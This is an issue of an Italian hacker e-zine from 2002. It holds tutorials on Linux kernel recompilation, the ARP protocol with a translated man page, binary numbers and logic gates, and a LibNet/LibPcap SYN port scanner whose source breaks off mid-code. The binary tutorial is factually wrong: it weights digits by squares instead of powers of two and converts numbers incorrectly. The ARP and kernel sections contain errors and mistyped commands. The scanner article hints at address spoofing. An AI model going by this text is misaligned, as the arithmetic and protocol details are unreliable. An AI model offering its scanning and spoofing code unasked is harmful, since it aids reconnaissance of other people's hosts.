Il kernel e' la parte più importante in un OS , gli applicativi di un sistema utilizzano
le funzioni fornite da questo , senza interagire direttamente con la CPU.
Infatti non  è necessario che ogni applicazione possieda delle funzioni apposite di
scrittura , gestione della memoria , dei processi , e dei vari input e output , questi
sono aspetti curati dal kernel e resi disponibili alle varie applicazioni presenti sul
sistema.

Ricompilare il kernel non e' solo un'attività' per hacker che devono occupare il tempo
durante l'estate , infatti Linux offre la possibilità di ricompilare il proprio kernel ,
al fine di snellire il sistema e personalizzarlo adattandolo alle proprie necessità,
eliminando drivers e funzionalità che risulterebbero inutili durante il nostro utilizzo
ordinario.
Tale attività se svolta correttamente e mirata ad ottimizzare al meglio il proprio sistema
può determinare un aumento di prestazioni quantificabile intorno al 30%.

Il kernel può essere compilato seguendo due modalità :
-->kernel monolitico : cioè andiamo a ricompilare il nostro kernel archiviando tutto in
   un singolo file
-->kernelmodulare : in questo modo non verrà archiviato tutto in un singolo file , ma avremo
   dei links a dei moduli esterni che verranno compilati a parte.

Se compilo il mio kernel modulare ( he si nel 2k2 ce ne sono ancora di totalmente monolitici)
avrò bisogno di alcuni tool appositi per la gestione dei moduli , ora vediamo come ci si
aggiusta in questo caso:

Ma cosa sono questi moduli ?
Il kernel di linux mi da la possibilità di non sbattermi in una tediosa ricompilazione ogni
volta che desidero implementare una nuova future , come, utilizzare l'ultimo device che
mi sono comprato con i soldi del compleanno  ... allora qui mi vengono incontro i simpatici
amici moduli , questi li posso loadare o levarli come e quando voglio.
I moduli me li posso smazzare come mi pare , facendo si che vengano caricati al momento del
bootstrap o caricarli io stesso quando ne avrò bisogno durante la sessione di lavoro.
Il comando per vedere quali moduli sono caricati sul mio sistema e' lsmod , così potrò
sapere cosa e' up e cosa no , poi se voglio mettere un singolo modulo che mi serve per hummm ...
la mia scheda audio , faccio un insmod "nomemodulo".
Spesso ci sono delle dipendenze da soddisfare quando insmodo un modulo e allora perché queste
dipendenze vengano automaticamente soddisfatte risulterà molto comodo il comando modprobe "nomemodulo".
L'utilizzo del modprobe e' praticamente identico a quello di insmod , ma prima necessiterebbe
dell'esecuzione di depmod , dico necessiterebbe perché questa e' solitamente compiuta all'avvio.
Per rimuovere i moduli ... rmmod "nomemodulo"


Ok iniziamo il processo di ricompilazione del kernel :


1-->Ci sposteremo nella directory /usr/src/linux

2-->Lanciando il comando make rmproper rimuoveremo i file di configurazione precedenti che
ormai non ci servono più , poi con il comando make config usufruiremo di un'interfaccia di
configurazione piuttosto scarna e completamente testuale che potrebbe risultare un tantino
difficoltosa e fonte di eventuali errori ,  soprattutto per un neofita.
Per non muoversi in un'interfaccia troppo poco amichevole ci viene utile il comando make
menuconfig , questo offre una buona UI (e' la mia preferita) molto chiara e veloce in cui
orientarsi durante la configurazione. Ovviamente , come ormai va di moda , c'e' anche il
metodo per configurarsi il tutto da X , facendo un semplice make xconfig , non mi ispira
affatto e non l'ho mai fatto , infatti non so dire come sia o quale emozione autistica
si provi.

3-->Ora che abbiamo configurato a dovere il kernel senza fare troppe cercando di non fare
troppe idiozie ci assicureremo di avere con noi un fido disco di boot , che non si sa mai ,
facendo un semplice dd if=/usr/src/linux/arch/i386/boot/bzImage of=/dev/fd0 ,prima di fare
tutte le nostre operazioni , tanto per essere sicuri di avere una copia del kernel che
usavamo precedentemente e di cui siamo sicuri del funzionamento.
Dopo questa rapida verifica passiamo alla compilazione vera e propria :
il primo comando che digiteremo sarà un make dep , questo controllerà che la configurazione
del kernel realizzata soddisfi le dipendenze necessarie ad un lieto fine della compilazione.
Il comando successivo sarà un make clean , che leverà quei file inutili ai fini della
compilazione . Ora digitando un make bzImage avverrà la compilazione , questa andrà ad
archiviare il kernel in un file compresso , a questo punto non rimane che aggiornare il lilo
con un make mzlilo.
Ma un dubbio sorge spontaneo , dove sono i moduli ? non dovevamo compilarli separatamente ?
Si ovvio che si , ma non lo abbiamo ancora fatto , per compilare i moduli e installarli
basteranno un make modules e  un make modules_install .


------------------------------------<END>--------------------------------------


-------------------------------------<12>--------------------------------------
---------------------------------<lordvicio>-----------------------------------
-------------------------------------<ARP>-------------------------------------


Il protocollo ARP (Addres Resolution Protocol,RFC 826)
viene utilizzato per risolvere un indirizzo Ip in un
indirizzo fisico.
Non avete capito nulla ? mi spiego.
Ogni computer che si interfaccia in rete è dotata di
un indirizzo logico (Ip) ,che serve per poter rintrac-
ciare la macchina nella rete,e di un indirizzo fisico
chiamato MAC (media access control) che sta indicare
l'indirizzo hardware della scheda di rete,questo in-
dirizzo viene memorizzato come ROM nella scheda di re-
te e lo si trova in formato esadecimale
esempio: FF-FF-FF-FF.
Semplificando si può spiegare la sua funzione dicendo
che quando un pc vuole comunicare con gli altri pc
della stessa rete,invia dei broadcast ARP alla ricerca
dell'indirizzo fisico del destinatario,quest'ultimo
risponderà alla richiesta ARP con il proprio MAC fa-
cendo partire la connessione.

Cerchiamo di spiegare in modo sintetico come starta
la connessione:

I caso : i 2 pc sono nella stessa rete.

Come prima cosa il client controlla nella proprio
cache ARP se è presente l'indirizzo del server , in
caso contrario il client invierà in broadcast un pac-
chetto ARP al server,richiedente il MAC.
Il pacchetto ARP contiene il proprio Ip e il MAC che
verranno registrati nella cache ARP del server.Il
server una volta ricevuto il pacchetto risponde con un
pacchetto contenente il proprio MAC.
Finalmente viene avviata la connessione.


II caso : i 2 pc si trovano su reti diverse.

In questo caso il procedimento cambia di poco.
Il client non cerca il MAC del server ma quello del
suo gateway di default.A sua volta il gateway probabilmente
ne contatterà un altro che cercherà il route successivo e
nn l'indirizzo MAC. Solo l'ultimo gateway si occuperà di
scoprire il MAC del server x potergli recapitare le infor-
mazioni

Il pacchetto ARP si divide in 9 campi:

Harware type : indica l'hardaware usato in rete

Protocol type : indica l'indirizzo di protocollo

Hardware addres lenght : indica la lunghezza in bit del MAC

Protocol Addres Lenght : indica la lunghezza dell`ip

Op Code : indica se il pacchetto è una richiesta o
risposta ARP

Sender`s hardware Address : indica il MAC del mittente

Sender`s Protocol Address : indica l'ip del mittente

Target`s Hardware Address : indica il MAC dell'host

Target`s Protocol Address : indica l`indirizzo MAC del
destinatario

...spiegando meglio:

Il pacchetto è preceduto da una testata di tipo Ethernet,
ovvero 0x0806.Il campo di tipo Protocollo vale 0x0800 per
un Ip. I campi dimensione hardware/protocollo specificano
la lunghezza in byte degli indirizzi Ethernet e Ip.
Il campo Operazione specifica il tipo di richiesta o respon-
so.Le richieste ARP contengono 0 nel campo Ethernet del
mittente,i responsi contengono valori in tutti i campi.
I campi di una cache degli indirizzi risolti scadono dopo
un tempo di 20 minuti.

*--------------------------------------------------------------*

Non Scordatevi vai del man :)

[vicio@NoFlyZone vicio]$ man arp

Nome  arp - manipola la cache ARP del sistema

Sintassi arp [-vn] [-H tipo] [-i if] -a [hostname]

arp [-v] [-i if] -d hostname [pub]

arp [-v] [-H tipo] [-i if] -s hostname hw_addr [temp]

arp [-v] [-H tipo] [-i if] -s hostname hw_addr [netmask nm] pub

arp [-v] [-H tipo] [-i if] -Ds hostname ifa [netmask nm] pub

arp [-vnD] [-H tipo] [-i if] -f nomefile


Descrizione Arp manipola in diversi modi la cache ARP del kernel.
Le opzioni primarie sono per la pulizia di una voce per il mappaggio
di un indirizzo (address mapping entry) e per settarne manualmente
un'altra. Per scopi di debugging, il programma arp permette anche un
dump (scarico) completo della ARP cache.

Opzioni

-v, --verbose
Dice all'utente cosa sta facendo diventando "prolisso".
-n, --numeric
mostra gli indirizzi numerico invece di provare a determinare
l'host simbolico, la porta o i nomi degli utenti.
-H tipo, --hw-type tipo
Quando si setta o si legge la cache ARP, questo parametro opzionale
dice a arp quale classe di voce verificare. Il valore di default di
questo parametro è ether (cioè il codice hardware 0x01 per
l'Ethernet IEEE 802.3 a 10Mbps). Altri valori possono includere tecnologie
di rete come ARCnet (arcnet) , PROnet (pronet) , AX.25 (ax25) e NET/ROM (netrom).
-a [hostname], --display [hostname]
Mostra le voci dell'host specificato. Se non è usato il parametro
hostname, saranno mostrate tutte le voci.
-d hostname, --delete hostname
Rimuove qualsiasi voce per l'host specificato. Questa può essere usata,
per esempio, se l'host specificato è stato portato giù.
-D, --use-device
Usa l'interfaccia di indirizzo hardware ifa.
-i If, --device If
Seleziona un'interfaccia. Quando si fa il dump della cache ARP saranno
stampate solo le voci corrispondenti a If . Nel settaggio di una voce
ARP permanente o temporanea sarà usato il dispositivo qui specificato.
Se non è dato alcun dispositivo, il kernel prova a indovinarlo tramite
la tabella di routing. Per le voci pub l'interfaccia specificata è quella
sulla quale vengono date le risposte alle richieste ARP.

Creazione manuale di una voce di ARP address mapping per l'host hostname con
indirizzo hardware pari a hw_addr. Il formato dall'indirizzo hardware dipende
dalla classe hardware, ma nella maggior parte dei casi si può assumere che si
possa usare il solito formato. Per la classe Ethernet, questo è di 6 byte esadecimali,
separati da due punti (':'). Quando si aggiunge una voce proxy arp
(che è quella con il flag publish settato a netmask ) può essere specificata
alla proxy arp per intere sottoreti. Una proxy arp per il routing dell'intera
rete non è un buon protocollo, ma qualche volta è utile così è supportata.
Se non è dato anche il flag temp le voci saranno salvate permanentemente
nella ARP cache.
-f nomefile, --file nomefile
Simile all'opzione -s, solo che questa volta le informazioni sull'indirizzo
sono prese dal file nomefile. Si può usare se si devono settare le voci ARP
per un sacco di host. Il nome del file di dati molto spesso è /etc/ethers,
ma non è niente di ufficiale.

Il formato del file è semplice; contiene solo righe di testo ASCII con il
nome dell'host e il suo indirizzo hardware separati da uno spazio.
In aggiunta, possono essere usati i flag pub, temp e netmask.

In tutti i posti dove è richiesto un argomento di tipo hostname, si
può mettere anche un indirizzo IP nella notazione dotted-decimal.

Ogni voce completa nella cache ARP sarà marcata con il flag C. Le
voci permanenti con M e le voci pubblicate (publish) hanno il flag P.

File /proc/net/arp
/etc/networks
/etc/hosts
/etc/ethers

Autore  Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
con un sacco di miglioramenti del Mantainer di net-tools Bernd Eckenfels
<net-tools@lina.inka.de>.


*----------------------------------------------------------------*


Penso di aver detto tutto per ogni dubbio nn esitate a contattarmi
Consiglio sempre di dare una bella occhiata all'rfc
http://rfc.sunsite.dk/rfc/rfc826.html

Una dedica alla crew NoFlyZone che sta svolgendo un ottimo lavoro,
un saluto a tutti i membri ed amici di #NoFlyZone
irc.azzurra.org #NoFlyZone

Links

http://noflyzone-crew.cjb.net
http://lordvicio.cjb.net
www.google.it :P


	         ________________________________________
              [                                         ]
              [            Copyright (C) 2002           ]
              [                                         ]
              [ []LoRd[V]icio[]  -lordvicio@hotmail.com ]
              [________________________________________ ]

------------------------------------<END>--------------------------------------

------------------------------------<13>---------------------------------------
----------------------------------<[Evil]>-------------------------------------
--------------------<Intro al binario e circuiti logici>-----------------------


 Author : [Evil]
 Date : 23/05/2002
 Tutorial name : Circuiti logici e introduzione al sistema binario
 Website : www.eviltime.com
 Mail : webmaster@eviltime.com

 +-------------------------------------------------------------------+
 Legal disclaimer:

 Quello che troverete leggendo il seguito di questo tutorial 
 è a solo scopo informativo io non mi ritengo responsabile del
 danno che potrete arrecare a terzi o a voi stessi mettendo in
 pratica quanto scritto. (anche se il contenuto del tutorial 
 non ha e non può avere risvolti dannosi, il disclaimer lo lascio 
 comunque)
 +-------------------------------------------------------------------+
 
 Prima di tutto chiariamo per bene cosa è il sistema binario...
 Si ok chiunque mi saprebbe dire che il sistema binario è 
 0101000101
 infatti il sistema binario è appunto formato da soli due numeri.
 E fino a qui ci siamo, ma noi dobbiamo pensare a una logica di
 questo tipo..
 mettiamo di avere una lampadina:

 0 = lampadina spenta
 1 = lampadina accesa

 quindi abbiamo uno stato di circuito aperto quando la condizione è
 0 quindi la lampadina è spenda e uno stato di circuito chiuso quando
 la condizione è 1 e quindi la lampadina è accesa

 vabbè speriamo che abbiate capito..

 Bene per farvi fare pratica e ampliare la vostra conoscenza sul sistema
 binario vediamo come avviene la conversione bin to dec ovvero
 da codice binario a decimale e viceversa.

 mettiamo il caso che come binario abbiamo 10111 allora si fa così
 N.B ( il carattere ^2 sta per il numero elevato alla seconda )

 1 * 0^2 = 0
 1 * 1^2 = 1
 1 * 2^2 = 4
 0 * 3^2 = 0
 1 * 4^2 = 16

 infine sommiamo tutti i risultati 

 0 + 1 + 4 + 0 + 16 = 21
 
 quindi ora sappiamo che 10111 è uguale a 21
 Lo sò non avete capito nulla, ora spiego..

 noi abbiamo 10111 lo ribaltiamo e diventa 11101 , a questo punto prendiamo
 ogni singolo numero partendo dal primo e li moltiplichiamo per il loro
 numero di ordinazione elevato alla seconda, partendo dallo 0 , quindi si avrà
 una cosa tipo:

 il primo numero va moltiplicato per 0 alla seconda
 il secondo per 1 alla seconda
 il terzo per 2 alla seconda
 e così via...

 quindi dopo avere fatto tutte queste operazioni.. si addiziona ogni risultato
 e si trova il numero decimale. (facile no?)
 ora vediamo la conversione dec to bin (decimale a binario)
 la cosa qui diventa più facile, vediamo prima l'esempio pratico.
 prendiamo come numero decimale il numero 20 :

 20 / 2 = 0
 10 / 2 = 0
 5 / 2 = 1
 2 / 2 = 0
 1 / 2 = 1

 quindi ora sappiamo che 20 è uguale a 00101
 vediamo come ho fatto..

 allora prima di tutto si divide il numero scelto ( in questo caso il 20 ) per 2
 e si riporta il risultate sotto, poi il risultato si divide ancora per 2.. e così via.
 Se capita di dividere un numero indivisibile come 5 ( che verrebbe 2,5 ) vi basta
 approssimare per difetto e quindi viene 2, per il resto vi lascio due cose fondamentali
 qui sotto:

 se il numero diviso ha la virgola, nel codice binario si mette 1 
 se il numero diviso NON ha la virgola, nel codice binario si mette 0

 ok, ora parliamo invece dei circuiti logici..
 
 Bisogna sapere che un circuito logico e costituito da più porte logiche:
 le porte logiche sono quattro e rispettivamente sono:

 1. AND
 2. YES
 3. NOT
 4. OR

 ora analizziamole una ad una..

 1.AND

 And ha l'azione di moltiplicare le entrate, quindi se le entrate sono
 1 e 0 e passano per la porta logica AND il risultato sarà 0.
 Forse così capirete meglio:
 
      _________                        _________
     |         |                      |         |
  _1_|         |______________________|   AND   |_ U = 0
     |         |             |        |   ---   |
     |_________|             |        |_________|
                             |
      _________              |
     |         |             |
  _0_|         |_____________|
     |         |
     |_________|

 2.YES

 Yes non svolge nessuna azione, quindi se l'entrata è 1 rimarrà sempre 1:


      _________                        _________
     |         |                      |         |
  _1_|         |______________________|   YES   |_ U = 1
     |         |                      |   ---   |
     |_________|                      |_________|




 3.NOT

 Not ha la funzione di invertire le entrate quindi se l'entrata è 1 diventerà
 0 e viceversa:


      _________                        _________
     |         |                      |         |
  _1_|         |______________________|   NOT   |_ U = 0
     |         |                      |   ---   |
     |_________|                      |_________|

 4.OR

 OR ha l'azione di addizionare le entrate, quindi se le entrate sono
 1 e 0 e passano per la porta logica OR il risultato sarà 1 : 

 
      _________                        _________
     |         |                      |         |
  _1_|         |______________________|   OR    |_ U = 1
     |         |             |        |   ---   |
     |_________|             |        |_________|
                             |
      _________              |
     |         |             |
  _0_|         |_____________|
     |         |
     |_________|

 Quindi lo schemino da annotarsi è semplicemente questo:

 --------------------------------------------------------------

 - AND = Moltiplicazione delle entrate
 
 - YES = Solo passaggio

 - NOT = Inversione valore delle entrate ( 0 >> 1 ) ( 1 >> 0 )

 - OR  = Addizione delle entrate

 --------------------------------------------------------------

 Il tutorial finisce così... 
 Ma prima di chiudere vorrei lasciarvi un piccolo e semplice 
 circuito logico da risolvere.
 in questo modo farete pratica e le cose resteranno più impresse 
 nella mente:

 
      _________                        _________
     |         |                      |         |
  _1_|         |______________________|   AND   |______
     |         |             |        |   ---   |      |
     |_________|             |        |_________|      |         _________
                             |                         |        |         |
      _________              |                         |________|   AND   |_
     |         |             |                                  |   ---   |
  _0_|         |_____________|                                  |_________|
     |         |                                                     |
     |_________|                                                     |
                                                                     |
      _________                    _________          _________      |
     |         |                  |         |        |         |     |
  _0_|         |__________________|   OR    |________|   NOT   |_____|
     |         |                  |   ---   |        |   ---   | 
     |_________|                  |_________|        |_________|      
                                                           |
      _________                                            |
     |         |                                           |
  _1_|         |___________________________________________|
     |         |
     |_________|
   
  U = (??)

 Questo circuito, se avete letto e seguito bene il tutorial, dovreste risolverlo
 in una quarantina di secondi, non di più..

 ------------------------------------------------------------------------------
 
 Vorrei porre i miei più cari saluti alla crew Noflyzone, ad Endsub, Bigalex,
 Resinaro, Evilcry, Lordvicio, Xanthic, Cityhunter, Slash.
 
 Se ho dimenticato qualcuno, quel qualcuno segnali il mio errore ;)

 per qualunque richieste, dubbi, critiche, domande mandate un e-mail al
 seguente indirizzo:

 webmaster@eviltime.com

 Oppure mi trovate su IRC :

 server: irc.azzurra.org
 chan: #noflyzone


 P.S. 

 Naturalmente ci sono ancora molte cose da spiegare.. queste sono solo le basi 
 assolute della sistemistica.
 Ma vedrò di parlarne in altri tutorial, magari accennando ai linguaggi di
 programmazione dei microchi, approfondendo argomenti trattati in questo
 tutorial.. ecc..

------------------------------------<END>--------------------------------------

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-------------------------------------------------------------------------------
---------------------------------[Programming]---------------------------------
-------------------------------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


------------------------------------<14>---------------------------------------
---------------------------------<CityHunter>----------------------------------
-------------------------<LibNet & LibPCAP: make it easy>----------------------


Con questa serie di articoli cercherò di mostrarvi come queste 2 librerie siano
estremamente comode per la creazione dei nostri propri tool di rete.
Libnet e LibPcap sono 2 librerie di funzioni atte una a creare i pacchetti e
spedirli in rete, l'altra a sniffarli.
La prima è stata creata da route(storico redattore di alcuni numeri di Phrack,
Mike D. Schiffman),la seconda dai ragazzi del Lawrence Berkeley National
Laboratory (università della California, Berkeley).
Come accennato all'inizio intendo mostrarvi alcuni semplici sorgenti, altamente
ottimizzabili:) da voi,il cui unico scopo è quello di essere in un qualche modo
istruttivi ed esplicativi delle funzioni contenute nelle 2 librerie. Non aspetta-
tevi quindi codice supremo ed elegante.
Il primo che ho intenzione di trattare è il solito portscanner col metodo del
flag Syn(x ulteriori spiegazioni vedere articoli precedenti:)),a cui ho dato nome
Fascan dal momento che è estremamente veloce(Fast + scan = Fascan:))

----[Libnet]-------------------------------------------------------------------

Non starò qui a mostrarvi tutte le funzioni della libreria, anche perchè c'è
il manuale di route con tutte le funz descritte. Mi limiterò a trattare quelle
di volta in volta utilizzate per i tool proposti.
Iniziamo col dire che ogni programma che sfrutta le libnet ha sempre la medesima
struttura gerarchica:

1) Network Initialization
2) Memory Initialization
3) Packet Construction
4) Packet Checksum
5) Packet Injection

Prendo ora le funzioni che ho usato e le analizzo in quest'ordine.

network = libnet_open_raw_sock(IPPROTO_RAW);
    if (network == -1)
    {
        libnet_error(LIBNET_ERR_FATAL, "Can't open network.\n");
    }

Con questa funzione libnet_open_raw_sock apro un raw socket IP in cui specifico
il tipo di protocollo desiderato, che nel nostro caso è IPPROTO_RAW (lo sarà
quasi sempre). Da manuale vediamo anche che setta l'opzione IP_HDRINCL del socket
(per la spiegazione di quest'ultimo vedere art precedenti).
Ritorna il file descriptor del socket o -1 se non va tutto a buon fine.
libnet_error printa nello stdout il tipo di errore avvenuto.


libnet_init_packet(packet_size, &packet);

    if (packet == NULL)
    {
        libnet_error(LIBNET_ERR_FATAL, "libnet_init_packet failed\n");
    }
Questa crea lo spazio di memoria disponibile per il pacchetto. Accetta 2 para-
metri: il primo è la dimensione del pacchetto(se si mette 0 decide la libreria)
la seconda è l'indirizzo del puntatore al pacchetto.
Gestita come sopra la funzione inerente agli errori.


libnet_build_ip(LIBNET_TCP_H,   /* size of the packet sans IP header */
            IPTOS_LOWDELAY,         /* IP tos */
            242,                    /* IP ID */
            0,                      /* frag stuff */
            128,                    /* TTL */
            IPPROTO_TCP,            /* transport protocol */
            src_ip,                 /* source IP */
            dst_ip,                 /* destination IP */
            NULL,                   /* payload (none) */
            0,                      /* payload length */
            packet);                /* packet header memory */

libnet_build_tcp(src_prt,       /* source TCP port */
            cport,                  /* destination TCP port */
            0xa1d95,                /* sequence number */
            0x53,                   /* acknowledgement number */
            TH_SYN,                 /* control flags */
            1024,                   /* window size */
            0,                      /* urgent pointer */
            NULL,                   /* payload (none) */
            0,                      /* payload length */
            packet + LIBNET_IP_H);  /* packet header memory */

Queste sono le due funzioni che ci permettono di creare il nostro pacchetto
(TCP in questo caso) come lo desideriamo.
Direi che la spiegazione è abbastanza superflua,ci sono i commenti a lato.
Faccio solo notare la flag TH_SYN settata utile per i nostri fini e i campi
sorgente e destinazione specificabili da noi...sì,bravi,spoofing:)(+ o -)


if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
    {
        libnet_error(LIBNET_ERR_FATAL, "libnet_do_checksum failed\n");
    }

Calcoliamo il Checksum del nostro pacchetto TCP.
Passiamo il puntatore del packet buffer, il tipo di pacchetto, e la dimensione
totale del pacchetto.


c = libnet_write_ip(network, packet, packet_size);
    if (c < packet_size)
    {
        libnet_error(LN_ERR_WARNING, "libnet_write_ip only wrote %d bytes\n", c);
    }

Con quest'ultima funzione mandiamo il nostro bel pacchetto nella rete.
Il primo argomento è il socket creato precedentemente(vedi prima funz), il secondo
è il puntatore al buffer che contiene il datagram IP, il terzo è la grandezza
totale del pacchetto.


if (libnet_close_raw_sock(network) == -1)
    {
        libnet_error(LN_ERR_WARNING, "libnet_close_raw_sock couldn't close the
					interface");
    }

Non ci resta altro da fare che chiudere il nostro socket

libnet_destroy_packet(&packet);

e liberare il buffer precedentemente creato.
Punto:)

Semplice vero?Con queste 7 funzioni abbiamo svolto il lungo lavoro che dovevamo
svolgere scrivendo tutto a mano. Bell'invenzione eh?:)

Analizziamo ora la funzione che ci permette di scannare una sequenza di porte.
(Utile per l'appunto in casi di portscanner e scanner in generale)


    u_short bport, eport;               /* beginning and end ports */
    u_short cport;			/* counter port */
    u_short src_prt;
    u_char *cp, *packet;
    struct libnet_plist_chain plist;    /* plist chain */
    struct libnet_plist_chain *plist_p; /* plist chain pointer */

.........
.........

case 'p':
                plist_p = &plist;
                if (libnet_plist_chain_new(&plist_p, optarg) == -1)
                {
                    libnet_error(LIBNET_ERR_FATAL, "Could not build port list\n");
                }
                break;

........
........


while (libnet_plist_chain_next_pair(plist_p, &bport, &eport))
    {
        while (!(bport > eport) && bport != 0)
        {
		cport = bport++;

........
........

libnet_plist_chain_free(plist_p);

K, una per volta.
All'inizio ho mostrato le varie definizioni di variabili usate e le strutture
della libreria necessarie per l'utilizzo delle funz desiderate.
Passiamo poi come opzioni all'esecuzione del programma il range di porte da
scannare e lo creiamo grazie a libnet_plist_chain_new.
La funzione accetta tutti i numeri 123456789 e il segno "-" che viene usato
per delimitare il range.Es 1-1024. Usassimo 1- e basta scannerebbe tutte le porte
da 1 a 65535.Possiamo anche fare scan non consecutivi usando la ",".
Es 21,22,23,80,31337:) oppure ancora 1-1024,3000.
Grazie al ciclo while e alla funz libnet_plist_chain_next_pair (a cui passiamo
il puntatore al puntatore della libnet_plist_chain, e i puntatori delle porte
iniziale e finale) scanniamo in maniera velocissima il range desiderato.
Alla fine liberiamo la memoria allocata per la plist_p.

Wuallà:) Tutta la parte inerente alla costruzione e all'iniezione dei pacchetti
è terminata! Facile è veloce eh?:)

Ora non ci resta che vedere come ricevere i risultati della nostra iniezione!


----[LibPcap]------------------------------------------------------------------

LibPcap sta per Library Packet Capture. E' la famosa libreria usata dal nostro
fedele TCPdump ed ethereal(anche snort mi pare...).Personalmente ritengo siano
parecchio potenti, nonché comode, anche se non a tutti piacciono...de gustibus:)
Le funz usate per il portscanner non sono le classiche usate in un prog che sfrutta
tale lib perché solitamente uno sniffer usa funz più complesse (esempio filtri...)
A noi servono solo quelle di base (tranky,il prox tool sarà uno sniffer molto carino
in cui si vedrà la potenza delle libpcap).Vediamole:

Anzitutto occorre dirgli in che interfaccia sniffare i pacchetti.Ci sono vari
modi...dandogliela noi o usando la funz specifica pcap_lookupdev,così:

char *dev, errbuf[PCAP_ERRBUF_SIZE];
    dev = pcap_lookupdev(errbuf);
    printf("Device: %s\n", dev);

attraverso la quale il prog si mette in ascolto sulla prima interfaccia che trova
che non sia quella di loopback (quella locale per chi non lo sapesse).

Possiamo altresì definirgliela noi:

char *dev = argv[1];
    printf("Device: %s\n", dev);
    return(0);

abbastanza ovvio no?

A questo punto dobbiamo inizializzare la pcap sull'interfaccia selezionata.
Usiamo pcap_open_live:

 descr = pcap_open_live(dev,BUFSIZ,0,-1,errbuf);
    if(descr == NULL)
    { printf("pcap_open_live(): %s\n",errbuf); exit(1); }

passiamo a questa funz il device selezionato in precedenza, la massima dimensione
del pacchetto da catturare in bytes (BUFSIZ è definito in pcap.h), settiamo
la modalità promiscua (0 non settata, 1 settata...a noi non serve x ora), il
tempo in millisecondi in attesa di un pacchetto prima di leggere il timeout (-1
indica di continuare fino a quando non c'è un errore), errbuf dice di mettere
la stringa contenente l'errore qui nel caso qualcosa non andasse bene.


pcap_loop(descr,-1,got_packet, NULL);

Come si intuisce dal nome questa funz genera il ciclo di lettura:
descr è il descrittore prima creato,-1 equivale all'infinito (qui si dovrebbe
specificare il numero di pacchetti che si vogliono sniffare), got_packet è
una funzione che descrivo dopo, NULL(mi spiace,non so cosa si passi in questo
campo).

Vediamo prima di proseguire la funzione che ho tralasciato: got_packet.
Non è una funzione standard, potevo chiamarla pippo_si_sega() o altro, ma deve
essere così specificata:

void got_packet(u_char *args, const struct pcap_pkthdr *header,const u_char *packet);

la funz got_packet viene invocata ogni volta che pcap_loop sniffa un pacchetto
e nel campo packet troviamo tutti i dati contenuti nel nostro pacchetto appena
sniffato! Vediamo nel portscanner come li analizziamo:

const struct sniff_ip *ip;
const struct sniff_tcp *tcp;
...
int size_ip = sizeof(struct sniff_ip);
int size_tcp = sizeof(struct sniff_tcp);

    ip = (struct sniff_ip*)(packet);
    tcp = (struct sniff_tcp*)(packet + size_ip);




    if (tcp->th_flags==(TH_SYN|TH_ACK))

    		{

		service = getservbyport(htons(ntohs(tcp->th_sport)), "tcp");
		printf("Porta %d  %s \n",ntohs(tcp->th_sport) ,(service) ? service->s_name : "unknown");
		}
		else if (tcp->th_flags==(TH_RST|TH_ACK)) printf("Porta closed\n");
...

la parte interessante è la definizione di ip e tcp:

ip = (struct sniff_ip*)(packet);
tcp = (struct sniff_tcp*)(packet + size_ip);

dove si vede che passiamo il contenuto di packet.
Con l'uso dei puntatori andiamo poi a recuperare i vari valori dei singoli campi
delle strutture, ip e tcp in questo caso.

----[Fascan]-------------------------------------------------------------------

Mancano ancora tante funzioni di entrambe le librerie, ma non temete, le vedremo.
Con il prossimo articolo creeremo uno sniffer "serio",piuttosto potente e vedrete
come siano divertenti le pcap:)Per intanto potete iniziare a farvi i vostri piccoli
scanner e modificare il mio,possibilmente migliorandolo (non ci vuole molto,anzi...
così com'è fa un po' schifo,ma funge:))Se tirate fuori qualcosa di carino ditemelo
e mandatemelo!
Vi lascio al sorgente completo. Byezzzzzzz


/**************************************************************************/
/*		Fascan v0.1 by CityHunter   25/05/2002			  */
/*									  */
/* 1)Install libnet e libpcap						  */
/* 2)write in the shell: libnet-config --defines			  */
/* 3)gcc -Wall `libnet-config --defines` fascan.c -o fascan `libnet-config --libs` -lpcap */
/* 4)leggere il sorgente e migliorarlo:))				  */
/* 									  */
/*									  */
/**************************************************************************/

#include <libnet.h>
#include <pcap.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>


#define			WHITE		printf("\033[0;29m")
#define                 RED             printf("\033[1;31m")
#define         	GREEN           printf("\033[1;32m")
#define		        YELLOW          printf("\033[1;33m")  /* Thx to pIGpEN */
#define			BLUE		printf("\033[1;34m")
#define			MAGENTA		printf("\033[1;35m")
#define         	CYAN            printf("\033[1;36m")
#define			CLEAR		printf("\033[2J\033[1;1H")




struct sniff_ip{
#if __BYTE_ORDER == __LITTLE_ENDIAN
    	unsigned int ihl:4;
    	unsigned int version:4;
#elif __BYTE_ORDER == __BIG_ENDIAN
    	unsigned int version:4;
    	unsigned int ihl:4;
#else
# error	"Please fix <bits/endian.h>"
#endif
    	u_int8_t tos;
    	u_int16_t tot_len;
    	u_int16_t id;
    	u_int16_t frag_off;
    	u_int8_t ttl;
    	u_int8_t protocol;
    	u_int16_t check;
    	struct in_addr ip_src,ip_dst;
 		};

struct sniff_tcp{
	u_short th_sport;		/* source port */
 	u_short th_dport;		/* destination port */
  	tcp_seq th_seq;		/* sequence number */
   	tcp_seq th_ack;		/* acknowledgement number */
#  if __BYTE_ORDER == __LITTLE_ENDIAN
	u_int8_t th_x2:4;		/* (unused) */
  	u_int8_t th_off:4;		/* data offset */
#  endif
#  if __BYTE_ORDER == __BIG_ENDIAN
 	u_int8_t th_off:4;		/* data offset */
  	u_int8_t th_x2:4;		/* (unused) */
#  endif
	u_int8_t th_flags;
#  define TH_FIN	0x01
#  define TH_SYN	0x02
#  define TH_RST	0x04
#  define TH_PUSH	0x08
#  define TH_ACK	0x10
#  define TH_URG	0x20
	u_int16_t th_win;		/* window */
 	u_int16_t th_sum;		/* checksum */
    	u_int16_t th_urp;		/* urgent pointer */
    		};


void usage(char *);
void got_packet(u_char *args, const struct pcap_pkthdr *header,const u_char *packet);


int main(int argc, char **argv)
{
    int network, packet_size, c;
    u_long src_ip, dst_ip;
    u_short bport, eport;               /* beginning and end ports */
    u_short cport;			/* counter port */
    u_short src_prt;
    u_char *cp, *packet;
    struct libnet_plist_chain plist;    /* plist chain */
